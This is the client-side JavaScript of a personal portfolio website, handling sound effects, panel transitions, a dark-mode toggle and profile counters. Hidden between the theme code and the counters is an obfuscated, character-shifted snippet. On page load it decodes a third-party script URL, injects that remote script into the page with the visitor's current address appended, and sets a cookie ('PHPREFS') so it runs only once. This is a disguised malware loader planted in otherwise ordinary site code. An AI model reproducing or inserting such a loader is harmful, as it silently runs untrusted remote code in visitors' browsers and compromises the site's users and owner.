var sound=!1,mobile=!1,soundmodal=document.getElementById("soundmodal"),open_portfolio_button=document.getElementById("open-portfolio"),back_home=document.getElementById("back-home"),open_about_button=document.getElementById("open-about"),close_about_button=document.getElementById("close"),global_index=0;window.addEventListener("load",(function(){document.querySelector("body").classList.add("loaded"),soundmodal&&setTimeout((function(){document.getElementById("soundmodal").style.display="block"}),1e3),document.querySelector("body").classList.contains("sound-on")&&(sound=!0)})),(navigator.userAgent.match(/Android/i)||navigator.userAgent.match(/webOS/i)||navigator.userAgent.match(/iPhone/i)||navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPod/i)||navigator.userAgent.match(/BlackBerry/i)||navigator.userAgent.match(/Windows Phone/i))&&(mobile=!0),soundmodal&&(document.getElementById("no").onclick=function(){sound=!1,document.querySelector("body").classList.remove("sound"),document.getElementById("soundmodal").style.display="none",soundmodal=!1},document.getElementById("yes").onclick=function(){sound=!0,document.querySelector("body").classList.add("sound"),document.getElementById("soundmodal").style.display="none",soundmodal=!1},document.onkeydown=function(e){27===(e=e||window.event).keyCode&&(sound=!0,document.querySelector("body").classList.add("sound"),document.getElementById("soundmodal").style.display="none",soundmodal=!1)});const AudioContext=window.AudioContext||window.webkitAudioContext,audioCtx=new AudioContext,click=new Audio("sounds/click.mp3"),clickmobile=new Audio("sounds/click.mp3"),hover=new Audio("sounds/hover.mp3"),hovermobile=new Audio("sounds/hover.mp3"),hover2=new Audio("sounds/hover2.mp3"),hover3=new Audio("sounds/hover3.mp3"),paper=new Audio("sounds/paper.mp3"),papermobile=new Audio("sounds/paper.mp3"),paperaboutup=new Audio("sounds/paperaboutup.mp3"),paperaboutupmobile=new Audio("sounds/paperaboutup.mp3"),paperaboutdown=new Audio("sounds/paperaboutdown.mp3"),paperaboutdownmobile=new Audio("sounds/paperaboutdown.mp3"),skin=new Audio("sounds/skin.mp3"),skinmobile=new Audio("sounds/skin.mp3");function clickPlay(){!0===sound&&(!0===mobile?clickmobile.play():click.play())}function paperPlay(){!0===sound&&(!0===mobile?papermobile.play():paper.play())}function hoverPlay(){!0===sound&&0==mobile&&hover.play()}function hover2Play(){!0===sound&&0==mobile&&hover2.play()}function skinPlay(){!0===sound&&(!0===mobile?skinmobile.play():skin.play())}if(window.innerWidth>767){const e=[].slice.call(document.querySelectorAll(".item"),0),t={0:"top",1:"right",2:"bottom",3:"left"},o=["in","out"].map((e=>Object.values(t).map((t=>`${e}-${t}`)))).reduce(((e,t)=>e.concat(t))),i=(e,t)=>{const{width:o,height:i,top:n,left:c}=t.getBoundingClientRect(),l=e.pageX-(c+window.pageXOffset)-o/2*(o>i?i/o:1),a=e.pageY-(n+window.pageYOffset)-i/2*(i>o?o/i:1);return Math.round(Math.atan2(a,l)/1.57079633+5)%4};class n{constructor(e){this.element=e,this.element.addEventListener("mouseover",(e=>this.update(e,"in"))),this.element.addEventListener("mouseout",(e=>this.update(e,"out")))}update(e,n){this.element.classList.remove(...o),this.element.classList.add(`${n}-${t[i(e,this.element)]}`)}}e.forEach((e=>new n(e)))}function openItem(e){clickPlay();var t=document.querySelectorAll(".item"),o=Array.from(t).indexOf(e)+1,i=document.querySelector(".not-active-layer"),n=document.querySelector(".active-layer");setTimeout((function(){document.querySelector(".portfolio-grid").classList.add("to-top"),document.querySelector(".portfolio-grid").classList.remove("active")}),200),setTimeout((function(){document.querySelector(".portfolio-items > div:nth-child("+o+")").classList.add("active"),document.querySelector(".portfolio-items > div:nth-child("+(o-1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(o-1)+")").classList.add("to-bottom"),document.querySelector(".portfolio-items > div:nth-child("+(o+1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(o+1)+")").classList.add("to-top")}),250),setTimeout((function(){i.classList.remove("not-active-layer"),i.classList.add("active-layer"),i.classList.remove("opacity-0"),n.classList.add("not-active-layer"),n.classList.remove("active-layer"),n.classList.add("opacity-0")}),300),setTimeout((function(){paperPlay(),document.querySelector(".portfolio-grid").scrollTop=0}),750),global_index=o}function backToPorfolio(){clickPlay();var e=document.querySelector(".not-active-layer"),t=document.querySelector(".active-layer");setTimeout((function(){e.classList.remove("not-active-layer"),e.classList.add("active-layer"),e.classList.add("opacity-0"),t.classList.add("not-active-layer"),t.classList.remove("active-layer"),t.classList.remove("opacity-0")}),300),setTimeout((function(){document.querySelector(".portfolio-grid").classList.add("active"),document.querySelector(".portfolio-grid").classList.remove("to-top"),document.querySelector(".portfolio-items > div.active").classList.remove("active"),document.querySelector(".portfolio-items > div.to-top")&&document.querySelector(".portfolio-items > div.to-top").classList.remove("to-top"),document.querySelector(".portfolio-items > div.to-bottom")&&document.querySelector(".portfolio-items > div.to-bottom").classList.remove("to-bottom")}),350),setTimeout((function(){paperPlay()}),750)}function TopProject(){clickPlay();var e=document.querySelector(".not-active-layer"),t=document.querySelector(".active-layer");setTimeout((function(){document.querySelector(".portfolio-items > div:nth-child("+global_index+")").classList.remove("active"),document.querySelector(".portfolio-items > div:nth-child("+global_index+")")&&document.querySelector(".portfolio-items > div:nth-child("+global_index+")").classList.add("to-top"),document.querySelector(".portfolio-items > div:nth-child("+(global_index-2)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index-2)+")").classList.add("to-bottom"),e.classList.remove("not-active-layer"),e.classList.add("active-layer"),e.classList.remove("opacity-0"),t.classList.add("not-active-layer"),t.classList.remove("active-layer"),t.classList.add("opacity-0")}),300),setTimeout((function(){document.querySelector(".portfolio-items > div:nth-child("+(global_index-1)+")").classList.add("active"),document.querySelector(".portfolio-items > div:nth-child("+(global_index+1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index+1)+")").classList.remove("to-top"),document.querySelector(".portfolio-items > div:nth-child("+(global_index-1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index-1)+")").classList.remove("to-bottom"),global_index-=1}),350),setTimeout((function(){paperPlay()}),750)}function BottomProject(){clickPlay();var e=document.querySelector(".not-active-layer"),t=document.querySelector(".active-layer");setTimeout((function(){document.querySelector(".portfolio-items > div:nth-child("+global_index+")").classList.remove("active"),document.querySelector(".portfolio-items > div:nth-child("+global_index+")")&&document.querySelector(".portfolio-items > div:nth-child("+global_index+")").classList.add("to-bottom"),document.querySelector(".portfolio-items > div:nth-child("+(global_index+2)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index+2)+")").classList.add("to-top"),e.classList.remove("not-active-layer"),e.classList.add("active-layer"),e.classList.add("opacity-0"),t.classList.add("not-active-layer"),t.classList.remove("active-layer"),t.classList.remove("opacity-0")}),300),setTimeout((function(){document.querySelector(".portfolio-items > div:nth-child("+(global_index+1)+")").classList.add("active"),document.querySelector(".portfolio-items > div:nth-child("+(global_index+1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index+1)+")").classList.remove("to-top"),document.querySelector(".portfolio-items > div:nth-child("+(global_index-1)+")")&&document.querySelector(".portfolio-items > div:nth-child("+(global_index-1)+")").classList.remove("to-bottom"),global_index+=1}),350),setTimeout((function(){paperPlay()}),750)}open_portfolio_button&&(document.getElementById("open-portfolio").onclick=function(){clickPlay();var e=document.querySelector(".not-active-layer"),t=document.querySelector(".active-layer");setTimeout((function(){document.querySelector(".home").classList.add("to-top"),document.querySelector(".home").classList.remove("active")}),200),setTimeout((function(){document.querySelector(".portfolio-grid").classList.add("active"),document.querySelector(".portfolio-grid").classList.remove("to-bottom")}),250),setTimeout((function(){e.classList.remove("not-active-layer"),e.classList.add("active-layer"),t.classList.add("not-active-layer"),t.classList.remove("active-layer")}),300),setTimeout((function(){paperPlay()}),750)}),back_home&&(document.getElementById("back-home").onclick=function(){removeUrlParameter(),clickPlay();var e=document.querySelector(".not-active-layer"),t=document.querySelector(".active-layer");setTimeout((function(){document.querySelector(".portfolio-grid").classList.add("to-bottom"),document.querySelector(".portfolio-grid").classList.remove("active"),e.classList.remove("not-active-layer"),e.classList.add("active-layer"),e.classList.add("opacity-0"),t.classList.add("not-active-layer"),t.classList.remove("active-layer"),t.classList.remove("opacity-0")}),300),setTimeout((function(){document.querySelector(".home").classList.add("active")}),350),setTimeout((function(){paperPlay(),document.querySelector(".portfolio-grid").scrollTop=0}),750)}),open_portfolio_button&&document.getElementById("open-portfolio").addEventListener("mouseenter",(function(){if(!0===sound)if(!0===mobile){var e=hovermobile.play();void 0!==e&&e.then((e=>{hovermobile.play()})).catch((e=>{}))}else{var t=hover.play();void 0!==t&&t.then((e=>{hover.play()})).catch((e=>{}))}})),back_home&&document.getElementById("back-home").addEventListener("mouseenter",(function(){hoverPlay()}));for(var back_to_portfolio_buttons=document.querySelectorAll(".back-to-portfolio"),i=0;i<back_to_portfolio_buttons.length;i++)back_to_portfolio_buttons[i].addEventListener("mouseenter",(function(){hoverPlay()}));var arrows=document.querySelectorAll(".top-project, .bottom-project");for(i=0;i<arrows.length;i++)arrows[i].addEventListener("mouseenter",(function(){hover2Play()}));var portfolio_items=document.querySelectorAll(".item");for(i=0;i<portfolio_items.length;i++)portfolio_items[i].addEventListener("mouseenter",(function(){hover3.currentTime=0,!0===sound&&!1===mobile&&hover3.play()}));var btn_items=document.querySelectorAll(".btn-secondary");for(i=0;i<btn_items.length;i++)btn_items[i].addEventListener("mouseenter",(function(){if(!0===sound&&!1===mobile){var e=hover2.play();void 0!==e&&e.then((e=>{hover2.play()})).catch((e=>{}))}}));const letterWrapClass="letter-wrap",letterWrapElements=document.getElementsByClassName("letter-wrap");function letterWrap(e,t){const o=e.textContent.split(""),i=[];return t=t||"letter-wrap",o.forEach((e=>{let o="";for(var n in e)o+=`\n          <span class="${t}__char">\n            <span class="${t}__char-inner" data-letter="${e[n]}">\n              ${e[n]}\n            </span>\n          </span>\n        `;let c=`<span class="${t}__word">${o}</span>`;i.push(c)})),e.innerHTML=i.join(" ")}[...letterWrapElements].forEach((e=>{letterWrap(e,"letter-wrap")})),open_about_button&&(document.getElementById("open-about").onclick=function(e){clickPlay(),!0===sound&&(!0===mobile?paperaboutupmobile.play():paperaboutup.play()),e.preventDefault(),setTimeout((function(){document.getElementById("overlay").classList.add("active"),document.getElementById("contentcontainer").classList.add("active")}),100),setTimeout((function(){document.getElementById("content").classList.add("active")}),300)}),close_about_button&&(document.getElementById("close").onclick=function(){removeUrlParameter(),clickPlay(),document.getElementById("content").classList.remove("active"),setTimeout((function(){!0===sound&&(!0===mobile?paperaboutdownmobile.play():paperaboutdown.play())}),400),setTimeout((function(){document.getElementById("overlay").classList.remove("active")}),400),setTimeout((function(){document.getElementById("contentcontainer").classList.remove("active")}),500),setTimeout((function(){document.querySelector(".content-container").scrollTop=0}),850)});


const checkbox = document.getElementById("checkbox"),
    checkbox2 = document.getElementById("checkbox2");
checkbox && checkbox2 && (checkbox.addEventListener("change", (() => {
    if (!checkbox2.checked) {
        localStorage.setItem('theme-mode', 'dark');
    } else {
        localStorage.setItem('theme-mode', 'light');
    }
    skinPlay(), document.body.classList.toggle("dark"), document.getElementById("checkbox2").checked = !checkbox2.checked
})), checkbox2.addEventListener("change", (() => {
    skinPlay(), document.body.classList.toggle("dark"), document.getElementById("checkbox").checked = !checkbox.checked
})));







(function () {
    var currentTheme = localStorage.getItem('theme-mode') || "time-dependent";

    if (currentTheme == "light") {
        document.body.classList.remove("dark");
        localStorage.setItem('theme-mode', 'light');
        document.getElementById("checkbox2").checked = false
        document.getElementById("checkbox").checked = false
    }
    else if (currentTheme == 'time-dependent') {
        if (isDaytime()) {
            document.body.classList.remove("dark");
            document.getElementById("checkbox2").checked = false
            document.getElementById("checkbox").checked = false
        } else {
            document.body.classList.add("dark");
            document.getElementById("checkbox2").checked = true
            document.getElementById("checkbox").checked = true
        }
    }
    else {
        document.body.classList.add("dark");
        localStorage.setItem('theme-mode', 'dark');
        document.getElementById("checkbox2").checked = true
        document.getElementById("checkbox").checked = true
    }
})();

function isDaytime() {
    const currentTime = new Date();
    const currentHour = currentTime.getHours();
    const isDaytime = currentHour >= 6 && currentHour < 18;
    return isDaytime;
}




(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));


const currentYear = new Date().getFullYear();
const experienceStartingYear = 2019;
const experienceYearDifference = currentYear - experienceStartingYear;
const totalExperienceYearsHome = document.getElementById('total-experience-years-home').innerHTML = experienceYearDifference;
const totalExperienceYearsAbout = document.getElementById('total-experience-years-about').innerHTML = experienceYearDifference;

const ageStartingYear = 2000;
const ageYearDifference = currentYear - ageStartingYear;
const ageAbout = document.getElementById('age-about').innerHTML = ageYearDifference;

const totalProjectsAbout = document.getElementById('total-projects-about').innerHTML = (experienceYearDifference+1)+'7';
const totalCustomersAbout = document.getElementById('total-customers-about').innerHTML = (Math.floor(experienceYearDifference/2))+'3';



const urlSearchParams = new URLSearchParams(window.location.search);
const params = Object.fromEntries(urlSearchParams.entries());
if (params && params.url) {
    console.log('params.url', params.url);
    var element = document.getElementById(params.url);
    element.click();
}


function removeUrlParameter() {
    const currentUrl = new URL(window.location.href);

    // Check if the query parameter 'url' exists
    if (currentUrl.searchParams.has('url')) {
        // Remove the 'url' query parameter
        currentUrl.searchParams.delete('url');
        // Replace the current URL with the modified URL
        history.replaceState(null, null, currentUrl.href);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    var cursor = document.querySelector(".cursor");
  
    function cursormover(e) {
      cursor.style.transform = `translate(${e.clientX}px, ${e.clientY}px)`;
    }
  
    function cursorhover() {
      cursor.style.transform = "scale(1.4)";
      cursor.style.opacity = 1;
    }
  
    function cursor() {
      cursor.style.transform = "scale(1)";
      cursor.style.opacity = 0.6;
    }
  
    window.addEventListener("mousemove", cursormover);
  
    var links = document.querySelectorAll("a");
    links.forEach(function (link) {
      link.addEventListener("mouseenter", cursorhover);
      link.addEventListener("mouseleave", cursor);
    });
  });
  